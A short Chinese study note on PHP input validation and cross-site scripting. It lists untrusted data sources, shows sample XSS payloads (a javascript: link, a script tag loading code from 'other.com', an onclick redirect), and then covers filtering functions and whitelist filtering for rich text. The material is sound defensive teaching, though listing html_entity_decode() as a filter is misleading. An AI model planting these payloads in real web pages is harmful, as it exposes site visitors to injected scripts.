在开发应用时，一般会有个约定：不要信任任何来自不受自己控制的数据源的数据，例如：

- $_GET
- $_POST
- $_REQUEST
- $_COOKIE
- php://stdin
- php://input
- file_get_contents()
- 远程数据库
- 远程API
- 来自客户端的数据


## XSS
### XSS各种注入姿势

```
<a href='javascript:alert(1);'>click</a>
a标签的显式注入

<script src='http://other.com/hask.js'></script>
通过script标签加载恶意攻击脚本，script加载的脚本是会自动执行的

<a href="javascript:void(0);" onclick="location.href='http://www.baidu.com'">click</a>
通过点击事件来注入js脚本，同理其他标签的事件也能注入js脚本
```
说明：img标签只能加载图像，测试让img标签加载html页面、js代码均无法解析。


### XSS防范
1. 过滤掉html标签
2. 过滤js脚本代码

过滤函数：
```php
htmlentities()
# 将html标签转换成html实体

html_entity_decode()
# 将html实体转换成html标签

htmlspecialchars()
# 将特定字符转换成html实体

strip_tags()
# 将所有html标签删除
```
上述的php函数可以帮我们过滤或删除html标签和js脚本，但是有时候一些富文本输入要求允许用户输入一些特定元素。

### 富文本的过滤

一些情况下，我们希望用户能够输入一些特定的html元素，例如img标签、a标签。

对于富文本，可以考虑这样过滤：
- 先过滤掉白名单外所有的标签。
- 用正则表达式匹配白名单中的标签，匹配这个标签我们允许他设置的内容和属性。

通过这俩点变可以解决富文本的过滤问题。


### 作业 ###
- xss过滤方法
- 验证输入过滤类
- pdo demo
- mysqli demo
- sql过滤类
- 框架与过滤的整合